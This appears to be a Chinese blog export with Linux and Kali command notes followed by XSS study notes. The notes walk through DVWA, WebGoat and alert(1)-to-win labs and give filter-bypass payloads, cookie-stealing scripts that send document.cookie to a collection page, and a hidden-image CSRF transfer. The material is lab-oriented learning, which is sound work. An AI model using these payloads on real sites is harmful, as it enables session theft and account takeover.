<p><strong>clear</strong>        清屏</p>
<p><strong>alias</strong>        对命令重命名 如：alias showmeit=”ps -aux” ，另外解除使用unaliax showmeit</p>
<p><strong>kill</strong>         杀死进程，可以先用ps 或 top命令查看进程的id，然后再用kill命令杀死进程。</p>
<ul>
<li>kill -9  $(ps -ef | grep hnlinux)  #过滤出hnlinux用户进程</li>
<li>kill -u hnlinux  #方法二</li>
<li>kill -KILL 123456+  #强制杀死进程</li>
</ul>
<h5 id="三、vim使用"><a href="#三、vim使用" class="headerlink" title="三、vim使用"></a>三、vim使用</h5><p>vim三种模式：命令模式、插入模式、编辑模式。使用ESC或i或：l来切换模式。</p>
<p>命令模式下：</p>
<p><strong>q</strong>            退出</p>
<p><strong>:q!</strong>           强制退出</p>
<p><strong>:wq</strong>          保存并退出</p>
<p><strong>:set number</strong>   显示行号</p>
<p><strong>:set nonumber</strong>  隐藏行号</p>
<p><strong>/apache</strong>       在文档中查找apache 按n跳到下一个，shift+n上一个</p>
<p><strong>yyp</strong>          复制光标所在行，并粘贴</p>
<p>(左移一个字符←)、j(下一行↓)、k(上一行↑)、l(右移一个字符→)</p>
<h5 id="四、Kali-Linux目录结构（文件系统）"><a href="#四、Kali-Linux目录结构（文件系统）" class="headerlink" title="四、Kali Linux目录结构（文件系统）"></a>四、Kali Linux目录结构（文件系统）</h5><p><strong>bin</strong> 所有用户都可以使用的程序目录</p>
<p><strong>boot</strong> 引导程序GRUB等的存放目录</p>
<p><strong>dev</strong> 存放所有的设备目录</p>
<p><strong>etc</strong> 主要的存放配置文件的目录</p>
<p><strong>home</strong> 用户主目录 </p>
<p><strong>lib</strong> 库文件目录</p>
<p><strong>live-bulid</strong> build自己的kali版本的目录</p>
<p><strong>media</strong> 默认挂载外接存储的目录</p>
<p><strong>mnt</strong> 以前的linux常用的挂载目录</p>
<p><strong>usr</strong> 存放执行程序、共享文件</p>
<p><strong>var</strong> 存放日志、邮件等经常变化的内容。</p>
<h5 id="五、文件读写权限"><a href="#五、文件读写权限" class="headerlink" title="五、文件读写权限"></a>五、文件读写权限</h5><p>三种基本权限</p>
<p><strong>R</strong>      读     数值表示为4</p>
<p><strong>W</strong>     写     数值表示为2</p>
<p><strong>X</strong>      可执行  数值表示为1</p>
<h5 id="六、打包压缩命令"><a href="#六、打包压缩命令" class="headerlink" title="六、打包压缩命令"></a>六、打包压缩命令</h5><p><strong>gzip：</strong></p>
<ul>
<li>gzip *            #压缩目录下的所有文件</li>
<li>gzip -dv *    #解压文件，并列出详细信息</li>
</ul>
<p><strong>bzip2：</strong></p>
<p><strong>tar:</strong>         打包压缩</p>
<p>   <strong>-c</strong>        归档文件</p>
<p>   <strong>-x</strong>        压缩文件</p>
<p>   <strong>-z</strong>        gzip压缩文件</p>
<p>   <strong>-j</strong>        bzip2压缩文件</p>
<p>   <strong>-v</strong>        显示压缩或解压缩过程 v(view)</p>
<p>   <strong>-f</strong>        使用档名</p>
<p>例：</p>
<p><strong>tar -cvf /home/abc.tar /home/abc</strong>        只打包，不压缩</p>
<p><strong>tar -zcvf /home/abc.tar.gz /home/abc</strong>     打包，并用gzip压缩</p>
<p><strong>tar -jcvf /home/abc.tar.bz2 /home/abc</strong>    打包，并用bzip2压缩</p>
<p>当然，如果想解压缩，就直接替换上面的命令 tar -cvf / tar -zcvf / tar -jcvf 中的“c” 换成“x” 就可以了。</p>
<h5 id="七、linux管道"><a href="#七、linux管道" class="headerlink" title="七、linux管道"></a>七、linux管道</h5><p>将一个命令的标准输出作为另一个命令的标准输入</p>
<p>例：grep -r “close” /home/* | more    在home目录下所有文件中查找，包括close的文件，并分页输出。</p>
]]></content>
      <categories>
        <category>渗透测试学习</category>
      </categories>
      <tags>
        <tag>linux学习</tag>
      </tags>
  </entry>
  <entry>
    <title>XSS漏洞学习</title>
    <url>/2020/04/03/xss-lou-dong-xue-xi/</url>
    <content><![CDATA[<h2 id="XSS漏洞学习笔记-靶场实战"><a href="#XSS漏洞学习笔记-靶场实战" class="headerlink" title="XSS漏洞学习笔记+靶场实战"></a>XSS漏洞学习笔记+靶场实战</h2><p>[TOC]</p>
<h3 id="XSS漏洞相关知识点"><a href="#XSS漏洞相关知识点" class="headerlink" title="XSS漏洞相关知识点"></a>XSS漏洞相关知识点</h3><h5 id="XSS漏洞简介"><a href="#XSS漏洞简介" class="headerlink" title="XSS漏洞简介"></a>XSS漏洞简介</h5><p>​         XSS是跨站脚本攻击，属于被动式的攻击。XSS指的是恶意攻击者往Web页面里插入恶意html代码，当用户浏览该页之时，嵌入其中Web里面的html代码会被执行，从而达到恶意的特殊目的。</p>
<h5 id="XSS漏洞分类"><a href="#XSS漏洞分类" class="headerlink" title="XSS漏洞分类"></a>XSS漏洞分类</h5><ul>
<li>非持久性XSS攻击，当用户访问已被插入攻击代码的链接时，攻击代码执行，完成该次攻击。</li>
<li>持久型XSS攻击，攻击者把攻击代码永久存储在目标服务器上中，例如数据库，消息论坛，留言板，访问者日志等。当用户进入页面，代码就会被执行。</li>
<li>DOM型与前两者的差别是，只在客户端进行解析，不需要服务器的解析响应</li>
</ul>
<h5 id="XSS漏洞常见危害"><a href="#XSS漏洞常见危害" class="headerlink" title="XSS漏洞常见危害"></a>XSS漏洞常见危害</h5><ul>
<li>盗用cookie，获取敏感信息。（最常见）</li>
<li>劫持会话，执行任意操作（改密码、留言等CSRF)</li>
<li>强制弹出广告页面，刷广告流量</li>
<li>在访问量极大的一些页面上的XSS可以攻击一些小型网站，实现DDoS攻击的效果。</li>
<li>钓鱼，获取用户账号，密码</li>
<li>网页挂马，挖矿</li>
</ul>
<h5 id="关于JavaScript"><a href="#关于JavaScript" class="headerlink" title="关于JavaScript"></a>关于JavaScript</h5><ul>
<li>JavaScript是一种客户端的脚本语言，是运行的浏览器中的</li>
<li>浏览器会自动运行网页中的JavaScript代码，并且JavaScript代码对于用户来说是透明的</li>
</ul>
<p>网页中运行JavaScript的方式</p>
<p>1.引入外部js</p>
<pre><code>&lt;script src=&quot;https://cdn.staticfile.org/angular.js/1.4.6/angular.min.js&quot;&lt;/script&gt;</code></pre><p>2.使用超链接（javascript伪协议）</p>
<pre><code>&lt;a href=&quot;javascript:alert(1)&quot;&gt;&lt;/a&gt;</code></pre><p>3.使用标签</p>
<pre><code>&lt;script&gt;alert(1)&lt;/script&gt;</code></pre><p>4.使用事件方法</p>
<pre><code>&lt;img src=1 onerror=alert(1)&gt;</code></pre><p>常见事件：</p>
<table>
<thead>
<tr>
<th align="center">事件名称</th>
<th align="center">类型</th>
<th align="center">作用</th>
</tr>
</thead>
<tbody><tr>
<td align="center">onerror</td>
<td align="center">window事件属性</td>
<td align="center">在错误发生时运行的脚本</td>
</tr>
<tr>
<td align="center">onload</td>
<td align="center">window事件属性</td>
<td align="center">页面加载结束以后运行脚本</td>
</tr>
<tr>
<td align="center">onclick</td>
<td align="center">Mouse事件</td>
<td align="center">元素上发生鼠标点击时触发</td>
</tr>
<tr>
<td align="center">onmouseover</td>
<td align="center">Mouse事件</td>
<td align="center">当鼠标指针移动到元素上时触发</td>
</tr>
<tr>
<td align="center">oninput</td>
<td align="center">From事件</td>
<td align="center">当元素获得用户输入时运行的脚</td>
</tr>
</tbody></table>
<h5 id="探测XSS过程"><a href="#探测XSS过程" class="headerlink" title="探测XSS过程"></a>探测XSS过程</h5><p>1.构造一个独一无二且不会被识别为恶意代码的字符串用来提交到页面</p>
<p>   例如：hacker</p>
<p>2.使用浏览器审查工具进行代码审计，寻找构造的字符串是否在页面中显示。</p>
<img src="C:\Users\尚慧亮\Pictures\Saved Pictures\QQ截图20200201183252.png" style="zoom:50%;" />



<h5 id="xss常用的测试语句"><a href="#xss常用的测试语句" class="headerlink" title="xss常用的测试语句"></a>xss常用的测试语句</h5><ul>
<li><script>alert(1)</script>
</li>
<li><p><code>&lt;imgsrc=&quot;&amp;#106&amp;#97&amp;#118&amp;#97&amp;#115&amp;#99&amp;#114&amp;#105&amp;#112&amp;#116&amp;#58&amp;#97&amp;#108&amp;#101&amp;#114&amp;#116&amp;#40&amp;#39&amp;#88&amp;#83&amp;#83&amp;#39&amp;#41&amp;#59&quot;&gt;</code>//转换为10进制</p>
</li>
<li><p><code>&lt;img src=x onerror=alert(1)&gt;</code></p>
</li>
<li><p><code>&lt;iframe onload=alert(1)&gt;&lt;/iframe&gt;</code></p>
</li>
<li><a href=javascript:alert(1)>
</li>
<li><script>alert(document.cookie)</script>
</li>
<li><script>window.location="(黑页地址)";</script> 

<p>document.body.innerHTML=”<div style=visblity:visble;><h1></p>
</li>
</ul>
<h3 id="DVWA-XSS-部分"><a href="#DVWA-XSS-部分" class="headerlink" title="DVWA( XSS 部分)"></a>DVWA( XSS 部分)</h3><h4 id="XSS（reflect"><a href="#XSS（reflect" class="headerlink" title="XSS（reflect)"></a>XSS（reflect)</h4><p><strong>simple:</strong></p>
<p>尝试发现输入的语句直接插入到标签中</p>
<p><img src="C:%5CUsers%5C%E5%B0%9A%E6%85%A7%E4%BA%AE%5CDesktop~31370AWY0@A%5D%%5BZYLQ8I%5BI.png" alt=""></p>
<p>直接使用<code>&lt;script&gt;alert(1)&lt;/script&gt;</code>尝试，发现成功弹窗。</p>
<img src="C:\Users\尚慧亮\Desktop\QQ截图20200112112615.png" style="zoom: 33%;" />

<p>分析源码：</p>
<img src="C:\Users\尚慧亮\Desktop\5M26R`@5UXK[OQGO{ZMHYD2.png" style="zoom: 50%;" />

<p>代码只判断了name值是否为空。没有做任何过滤。</p>
<p><strong>尝试盗取cookie:</strong></p>
<p>在本地网站根目录新建cookie.php和cookie.txt。</p>
<p>cookie.php内容为</p>
<img src="C:\Users\尚慧亮\Desktop\QQ截图20200112124443.png" style="zoom: 50%;" />

<p>回到dvwa中构造攻击语句：</p>
<pre class=" language-javascript"><code class="language-javascript"><span class="token operator">&lt;</span>script<span class="token operator">></span>document<span class="token punctuation">.</span>location<span class="token operator">=</span><span class="token string">'http://127.0.0.1/cookie.php?cookie='</span><span class="token operator">+</span>document<span class="token punctuation">.</span>cookie<span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span></code></pre>
<p>得到cookie:</p>
<img src="C:\Users\尚慧亮\Desktop\QQ截图20200112124855.png" style="zoom:33%;" />

<p>回到DVWA的登录界面：</p>
<p>在火狐浏览器的控制台中编辑cookie重新发包：</p>
<img src="C:\Users\尚慧亮\Desktop\QQ截图20200112125154.png" style="zoom:50%;" />

<p>访问index.php发现成功以被攻击者身份登录。</p>
<p><strong>medium:</strong></p>
<p>首先尝试<code>&lt;script&gt;alert(1)&lt;/script&gt;</code>  发现<script>标签被过滤。</p>
<p>分析源码：</p>
<p><img src="C:%5CUsers%5C%E5%B0%9A%E6%85%A7%E4%BA%AE%5CDesktop%5CQQ%E6%88%AA%E5%9B%BE20200112114020.png" alt=""></p>
<p>代码使用 "str_replace"函数将<script>标签替换为空，且该函数是大小写敏感。我们可以采用多种方式绕过。</p>
<p>1.大小写绕过：<SCRIPT>alert(1)</SCRIPT></p>
<p>2.双写绕过：&lt;<script>script>alert(1)<</script>/script&gt;</p>
<p>3.利用img标签进行绕过：<code>&lt;img src=1 onerror=alert(1)&gt;</code></p>
<p> <strong>PS:  onerror事件会在文档或图像加载过程中发生错误时被触发</strong></p>
<p>  <strong>因为src=x就是一个错误代码，所以触发事件执行</strong></p>
<p><strong>high</strong>:</p>
<p>尝试<script>alert(1)</script> 无效。</p>
<p>再次尝试<code>&lt;img src=1 onerror=alert(1)&gt;</code>  成功。</p>
<p>同样可以使用：<code>&lt;iframe onload=alert(1)&gt;</code></p>
<p><strong>PS:<iframe>标签可以在一个html代码中嵌入另一个html内容</strong></p>
<p>​      <strong>onload 是js的一个事件，事件会在页面加载完成后，立即发生，同时执行被调用的程序。</strong></p>
<img src="C:\Users\尚慧亮\Desktop\QQ截图20200112114820.png" style="zoom:33%;" />

<p>分析源码：</p>
<p><img src="C:%5CUsers%5C%E5%B0%9A%E6%85%A7%E4%BA%AE%5CDesktop%5CQQ%E6%88%AA%E5%9B%BE20200112115042.png" alt=""></p>
<p><strong>impossible:</strong></p>
<p>尝试<code>&lt;script&gt;alert(1)&lt;/script&gt;</code>发现语句被原封不动输出。</p>
<p>查看后台代码：</p>
<img src="C:\Users\尚慧亮\Desktop\QQ截图20200112130818.png" style="zoom: 50%;" />

<p>引用博客大佬解释：</p>
<p>利用PHP函数<code>htmlspecialchars()</code>实现将特殊字符（逻辑与符号<code>&amp;</code>、双引号<code>&quot;</code>、单引号<code>&#39;</code>、小于号<code>&lt;</code>、大于号<code>&gt;</code>）转换为 HTML 实体，从而使得浏览器不解析其作为html元素构造脚本来执行，只是作为普通输入的字符来显示。</p>
<img src="C:\Users\尚慧亮\Desktop\QQ截图20200112141718.png" style="zoom: 67%;" />



<h4 id="XSS-DOM"><a href="#XSS-DOM" class="headerlink" title="XSS DOM"></a>XSS DOM</h4><p><strong>DOM xss产生的原因：</strong></p>
<p>​         DOM—based XSS漏洞是基于文档对象模型Document Objeet Model，DOM)的一种漏洞。DOM是一个与平台、编程语言无关的接口，它允许程序或脚本动态地访问和更新文档内容、结构和样式，处理后的结果能够成为显示页面的一部分。DOM中有很多对象，其中一些是用户可以操纵的，如uRI，location，refelTer等。客户端的脚本程序可以通过DOM动态地检查和修改页面内容，它不依赖于提交数据到服务器端，而从客户端获得DOM中的数据在本地执行，如果DOM中的数据没有经过严格确认，就会产生DOM—based XSS漏洞<br><strong>常用 xss DOM属性：</strong></p>
<p>document.referer</p>
<p>window.name</p>
<p>location</p>
<p>innerHTML</p>
<p>document.write</p>
<p>simple:</p>
<p>查看后台代码：</p>
<p><img src="C:%5CUsers%5C%E5%B0%9A%E6%85%A7%E4%BA%AE%5CDesktop%5CQQ%E6%88%AA%E5%9B%BE20200112131409.png" alt="">  </p>
<p> 什么都没有做。。。</p>
<p>随便选择一种语言：</p>
<p><img src="C:%5CUsers%5C%E5%B0%9A%E6%85%A7%E4%BA%AE%5CDesktop%5CQQ%E6%88%AA%E5%9B%BE20200112132346.png" alt=""></p>
<p>我们可以在之后接入我们想要执行的代码：<code>&lt;script&gt;alert(1)&lt;/script&gt;</code></p>
<p>成功弹窗：</p>
<img src="C:\Users\尚慧亮\Desktop\QQ截图20200112132515.png" style="zoom:33%;" />

<p> 火狐查看页面元素：</p>
<p><img src="C:%5CUsers%5C%E5%B0%9A%E6%85%A7%E4%BA%AE%5CDesktop%5CQQ%E6%88%AA%E5%9B%BE20200112132558.png" alt=""></p>
<p><strong>medium:</strong></p>
<p>查看后台代码：</p>
<img src="C:\Users\尚慧亮\Desktop\QQ截图20200112133547.png" style="zoom: 50%;" />

<p>代码使用了stripos函数过滤了<strong>&lt;script</strong>.并且不区分大小写。</p>
<p>我们可以使用<code>&lt;img src=1 onerror=1&gt;</code>绕过</p>
<p>我们查看页面源码：</p>
<option value='    "+lang+"      '> "  +decodeURl(lang) +  " </option>

<p>我们的目的是让语句插入option标签的值中进而执行。</p>
<p>直接插入：</p>
<p><img src="C:%5CUsers%5C%E5%B0%9A%E6%85%A7%E4%BA%AE%5CDesktop%5CQQ%E6%88%AA%E5%9B%BE20200112134126.png" alt=""></p>
<p>尝试闭合前面<option><select>标签</p>
<p>插入 <code>&gt;&lt;/option&gt;&lt;/select&gt;&lt;img src=1 onerror=alert(1)&gt;</code>成功</p>
<img src="C:\Users\尚慧亮\Desktop\QQ截图20200112134639.png" style="zoom:33%;" />

<p><strong>high:</strong></p>
<p>查看后台代码</p>
<img src="C:\Users\尚慧亮\Desktop\QQ截图20200112134821.png" style="zoom: 67%;" />

<p>白名单过滤，只允许传指定的default值。</p>
<p><strong>补充知识：url中有一个字符为#，该字符后的数据不会发送到服务器端，从而绕过服务端过滤</strong></p>
<p>构造攻击代码：</p>
<p><code>?default=English #&lt;script&gt;alert(1)&lt;/script&gt;</code></p>
<img src="C:\Users\尚慧亮\Desktop\QQ截图20200112140826.png" style="zoom: 33%;" />

<p><strong>impossible:</strong></p>
<p>后台代码:</p>
<img src="C:\Users\尚慧亮\Desktop\QQ截图20200112141157.png" style="zoom: 50%;" />

<p>注释里说保护的代码在客户端的里面。</p>
<p>我们尝试构造语句<script>alert(1)</script>发现没有任何反应。</p>
<p>我们查看源代码：</p>
<img src="C:\Users\尚慧亮\Desktop\QQ截图20200112141405.png" style="zoom: 80%;" />

<p><img src="C:%5CUsers%5C%E5%B0%9A%E6%85%A7%E4%BA%AE%5CDesktop%5CQQ%E6%88%AA%E5%9B%BE20200112141418.png" alt=""></p>
<p>发现这里对我们输入的参数并没有进行URL解码，所以我们输入的任何参数都是经过URL编码，然后直接赋值给option标签。所以，就不存在XSS漏洞了。</p>
<h4 id="XSS-stored"><a href="#XSS-stored" class="headerlink" title="XSS (stored)"></a>XSS (stored)</h4><p><strong>simple:</strong></p>
<img src="C:\Users\尚慧亮\Desktop\QQ截图20200112142234.png" style="zoom:33%;" />

<p>出现一个留言框，直接在name中输入发现有字数限制，</p>
<p>直接使用火狐对页面元素进行修改。修改maxlength</p>
<p><img src="C:%5CUsers%5C%E5%B0%9A%E6%85%A7%E4%BA%AE%5CDesktop%5CQQ%E6%88%AA%E5%9B%BE20200112142128.png" alt=""></p>
<p>或者使用burp抓包绕过前端限制。</p>
<p><strong>medium:</strong></p>
<p><img src="C:%5CUsers%5C%E5%B0%9A%E6%85%A7%E4%BA%AE%5CDesktop%5CQQ%E6%88%AA%E5%9B%BE20200112142934.png" alt=""></p>
<p>str_replace():含有“<script>”的字符串替换为空</p>
<p>addslshes():函数返回在预定义字符之前添加反斜杠的字符串。</p>
<p>htmlspecialchars():函数把预定义的字符转换为HTML实体。</p>
<p>message防注入基本天衣无缝。。。。。</p>
<p>但是我们仍然可以通过name栏进行注入。</p>
<p>构造攻击语句：</p>
<p><code>&lt;Script&gt;document.location=&#39;http://127.0.0.1/1.php?cookie=&#39;+document.cookie;&lt;/script&gt;</code></p>
<h3 id="Webgoat-靶场-xss-部分"><a href="#Webgoat-靶场-xss-部分" class="headerlink" title="Webgoat 靶场 xss(部分)"></a>Webgoat 靶场 xss(部分)</h3><p><strong>stage 1: strored XSS</strong></p>
<ol>
<li>作为Tom，在个人简介编辑页执行存储型XSS攻击，验证Jerry会受到攻击影响。</li>
<li>使用Tom登录，修改Tom的个人简介编辑页的街道一栏，在其后添加,更新个人信息</li>
</ol>
<img src="C:\Users\尚慧亮\Desktop\QQ截图20200112164709.png" style="zoom: 50%;" />

<p>3.使用Jerry登录，选择Tom的个人信息进行查看，弹窗表明存储型XSS攻击成功。</p>
<img src="C:\Users\尚慧亮\Pictures\Saved Pictures\QQ截图20200112164941.png" style="zoom:50%;" />

<p><strong>Stage3:Stored XSS Revisited</strong></p>
<p>验证Bruce的个人简历中包含有XSS攻击，使用David用户登录，查看Bruce的个人简介，出现弹窗，表明存在XSS攻击。</p>
<img src="C:\Users\尚慧亮\Pictures\Saved Pictures\QQ截图20200112165159.png" style="zoom:50%;" />

<p><strong>Stage5:Reflected XSS</strong></p>
<p>1.利用查找职工页面的缺陷制作一个包含有反射型XSS的URL，验证其他使用这个链接的用户也会受到攻击影响。</p>
<p>2.使用用户Larry登录，在Search Staff搜索框中输入恶意代码。</p>
<img src="C:\Users\尚慧亮\Pictures\Saved Pictures\QQ截图20200112170452.png" style="zoom: 50%;" />

<p>使用tom登录查看搜素界面无法正常显示：</p>
<img src="C:\Users\尚慧亮\Pictures\Saved Pictures\QQ截图20200112170527.png" style="zoom:50%;" />

<h5 id="Stored-XSS-Attacks"><a href="#Stored-XSS-Attacks" class="headerlink" title="Stored XSS Attacks"></a><strong>Stored XSS Attacks</strong></h5><p>清除所有的输入是一个很好的选择，尤其是清除那些将被用作参数使用的输入。对于在应用程序中永久存储的内容特别重要。当用户的消息被检索时，不能出现不期望的消息内容。</p>
<p>在输入的内容中添加javascript代码，点击Submit按钮。</p>
<img src="C:\Users\尚慧亮\Pictures\Saved Pictures\QQ截图20200112171509.png" style="zoom:50%;" />

<p>点击我们刚刚创建好的帖子，触发xss</p>
<img src="C:\Users\尚慧亮\Pictures\Saved Pictures\QQ截图20200112171526.png" style="zoom:50%;" />

<h5 id="Reflected-XSS-Attacks"><a href="#Reflected-XSS-Attacks" class="headerlink" title="Reflected XSS Attacks"></a>Reflected XSS Attacks</h5><p> 在服务器端验证所有输入是一个很好的选择。未验证的用户输入可能会在HTTP响应中出现XSS。攻击者可以创建一个URL，通过让受害者点击的方式进行XSS攻击。</p>
<p>在digit access code框中添加攻击代码：</p>
<p>![](C:\Users\尚慧亮\Pictures\Saved Pictures\QQ截图20200112172146.png)0</p>
<p><strong>Cross Site Request Forgery (CSRF)</strong></p>
<p>​       在这一课中，您的目的是向一个新闻组发送一封邮件，邮件中包含一张图片，这个图像 的URL指向一个恶意请求。尝试一个包括1*1像素的图像，其中包含一个网址。这个URL 应当用一个额外的参数“transferFunds= 4000”指向CRSF课程页面。您可以通过左侧菜单在 CSRF课程连接上右键单击，选择复制快捷方式。无论谁收到这封邮件，并恰好已经通过身份验证，他的资金将会被转走。 <br>    注意:不同WebGoat环境的 URL中“Screen”和“Menu”参数可能会有所区别。注意使 用您但前访问URL中正在使用的参数。  </p>
<p>我们需要创建一个图片，链接到一个网站，格式如下：</p>
<p><code>&lt;img src=&quot;http://192.168.1.149/WebGoat/attack?Screen=52&amp;menu=900&amp;transferFunds=5000&quot; width=&quot;1&quot;height=&quot;1&quot;/&gt;</code></p>
<p>创建后提交</p>
<img src="C:\Users\尚慧亮\Pictures\Saved Pictures\QQ截图20200112173529.png" style="zoom:50%;" />

<p>点击刷新即可通关。</p>
<h3 id="XSS——alert-1-to-win"><a href="#XSS——alert-1-to-win" class="headerlink" title="XSS——alert(1)to win"></a>XSS——alert(1)to win</h3><p><strong>Warmup</strong></p>
<pre class=" language-javascript"><code class="language-javascript"><span class="token keyword">function</span> <span class="token function">escape</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">return</span> <span class="token string">'&lt;script>console.log("'</span> <span class="token operator">+</span> s <span class="token operator">+</span> <span class="token string">'");&lt;/script>'</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span></code></pre>
<p>代码直接拼接了输入的字符串，没有进行任何有效的过滤，我们尝试闭合即可。</p>
<p>")闭合前面的双引号和括号，后面使用// 或<!--注释“</p>
<p>尝试：<code>&quot;);alert(1) //</code>成功</p>
<p>也可以闭合前面的<script>标签</p>
<p>尝试:<code>&lt;/script&gt;;&lt;script&gt;alert(1)&lt;!--</code>成功</p>
<p><strong>Adobe</strong></p>
<pre class=" language-javascript"><code class="language-javascript"><span class="token keyword">function</span> <span class="token function">escape</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span> <span class="token punctuation">{</span>
    s <span class="token operator">=</span> s<span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token operator">/</span><span class="token string">"/g, '\\"</span>'<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> <span class="token string">'&lt;script>console.log("'</span> <span class="token operator">+</span> s <span class="token operator">+</span> <span class="token string">'");&lt;/script>'</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span></code></pre>
<p>代码将输入的双引号用\进行了转义，所以无法通过进行双引号的闭合。</p>
<p>但我们还可以通过<script>标签闭合绕过。</p>
<p>或者在输入的双引号前在加一个\对转义双引号的\进行转义。如下：</p>
<p>尝试<code>\&quot;);alert(1)//</code></p>
<p><strong>JSON</strong></p>
<pre><code>function escape(s) {
  s = JSON.stringify(s);
  return &#39;&lt;script&gt;console.log(&#39; + s + &#39;);&lt;/script&gt;&#39;;
}</code></pre><p>JSON 通常用于与服务端交换数据。</p>
<p>在向服务器发送数据时一般是字符串。</p>
<p>我们可以使用 JSON.stringify() 方法将 JavaScript 对象转换为字符串。</p>
<p>过滤了,"等字符。</p>
<p>尝试<code>&lt;/script&gt;&lt;script&gt;alert(1)//</code>成功</p>
<p><strong>Markdown</strong></p>
<pre class=" language-javascript"><code class="language-javascript"><span class="token keyword">function</span> <span class="token function">escape</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">var</span> text <span class="token operator">=</span> s<span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token regex">/&lt;/g</span><span class="token punctuation">,</span> <span class="token string">'&amp;lt;'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token regex">/"/g</span><span class="token punctuation">,</span> <span class="token string">'&amp;quot;'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token comment" spellcheck="true">// URLs</span>
    text <span class="token operator">=</span> text<span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token regex">/(http:\/\/\S+)/g</span><span class="token punctuation">,</span> <span class="token string">'&lt;a href="$1">$1&lt;/a>'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token comment" spellcheck="true">// [[img123|Description]]</span>
    text <span class="token operator">=</span> text<span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token regex">/\[\[(\w+)\|(.+?)\]\]/g</span><span class="token punctuation">,</span> <span class="token string">'&lt;img alt="$2" src="$1.gif">'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> text<span class="token punctuation">;</span>
<span class="token punctuation">}</span></code></pre>
<p>s.replace将<strong>< "</strong>转换成立HTML实体</p>
<p>text.replace意思为判断输入中是否含有http://,如果有就生成一个a标签,</p>
<p>第三波，如果字符串包含<code>[[img_src|img_alt]]</code>格式的字符串，则变为</p>
<p><code>&lt;img alt=&quot;img_alt&quot; src=&quot;img_src.gif&quot;&gt;</code></p>
<p><strong>Fruit</strong></p>
<pre class=" language-javascript"><code class="language-javascript"><span class="token comment" spellcheck="true">// CVE-2016-4618</span>
<span class="token keyword">function</span> <span class="token function">escape</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token keyword">var</span> div <span class="token operator">=</span> document<span class="token punctuation">.</span>implementation<span class="token punctuation">.</span><span class="token function">createHTMLDocument</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">createElement</span><span class="token punctuation">(</span><span class="token string">'div'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  div<span class="token punctuation">.</span>innerHTML <span class="token operator">=</span> s<span class="token punctuation">;</span>
  <span class="token keyword">function</span> <span class="token function">f</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token string">'SCRIPT'</span> <span class="token operator">===</span> n<span class="token punctuation">.</span>tagName<span class="token punctuation">)</span> n<span class="token punctuation">.</span>parentNode<span class="token punctuation">.</span><span class="token function">removeChild</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">var</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> i<span class="token operator">&lt;</span>n<span class="token punctuation">.</span>attributes<span class="token punctuation">.</span>length<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
      <span class="token keyword">var</span> name <span class="token operator">=</span> n<span class="token punctuation">.</span>attributes<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>name<span class="token punctuation">;</span>
      <span class="token keyword">if</span> <span class="token punctuation">(</span>name <span class="token operator">!==</span> <span class="token string">'class'</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> n<span class="token punctuation">.</span><span class="token function">removeAttribute</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
  <span class="token punctuation">}</span>
  <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span>map<span class="token punctuation">.</span><span class="token function">call</span><span class="token punctuation">(</span>div<span class="token punctuation">.</span><span class="token function">querySelectorAll</span><span class="token punctuation">(</span><span class="token string">'*'</span><span class="token punctuation">)</span><span class="token punctuation">,</span> f<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">return</span> div<span class="token punctuation">.</span>innerHTML<span class="token punctuation">;</span>
<span class="token punctuation">}</span></code></pre>
<p>代码给出了漏洞编号,查了一下得知；</p>
<p>问题来源于代码的逻辑不严谨，在<code>for</code>循环中，代码通过<code>n.attributes.length</code>来判断边界条件，但是<code>n.attributes.length</code>是动态变化的，如果存在多个属性，则最后一个属性是无法删除的，只要我们构造多个属性即可。</p>
<p><code>&lt;iframe t onload=alert(1)&gt;</code></p>
<h3 id="小迪XSS靶场"><a href="#小迪XSS靶场" class="headerlink" title="小迪XSS靶场"></a>小迪XSS靶场</h3><h5 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h5><p>我们需要闭合前面的文本标签</p>
<p><code>&lt;/textarea&gt;&lt;script&gt;alert(1)&lt;/script&gt;</code></p>
<img src="C:\Users\尚慧亮\Pictures\Saved Pictures\QQ截图20200201205424.png" style="zoom:50%;" />

<h5 id="0x03"><a href="#0x03" class="headerlink" title="0x03"></a>0x03</h5><p>过滤了圆括号(),但是我们仍然可以使用反引号执行.</p>
<p><code>&lt;script&gt;alert</code>1<code>&lt;/script&gt;</code></p>
<p>![](C:\Users\尚慧亮\Pictures\Saved Pictures\QQ截图20200120202706.png)</p>
